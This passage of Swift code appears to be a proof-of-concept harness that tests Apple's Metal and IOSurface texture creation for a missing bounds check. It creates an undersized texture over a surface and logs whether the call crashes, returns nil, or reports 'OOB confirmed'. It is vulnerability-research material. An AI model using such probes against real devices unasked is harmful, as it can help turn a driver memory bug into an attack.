    step("surf alloc OK — calling makeTexture with desc256 — GOODBYE")
    let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat:.bgra8Unorm, width:256, height:256, mipmapped:false)
    td.storageMode = .shared
    var excPtr: UnsafeMutablePointer<CChar>? = nil
    let tex = metal_make_texture_safe(device, td, surf as! IOSurfaceRef, 0, &excPtr)
    // If we're still alive (shouldn't happen):
    if let ep = excPtr { let m = String(cString: ep); free(ep); step("EXCEPTION: \(m)") }
    else if tex == nil { step("nil — no crash, bounds-checked silently") }
    else { step("*** OK — NO BOUNDS CHECK — OOB confirmed ***") }
}
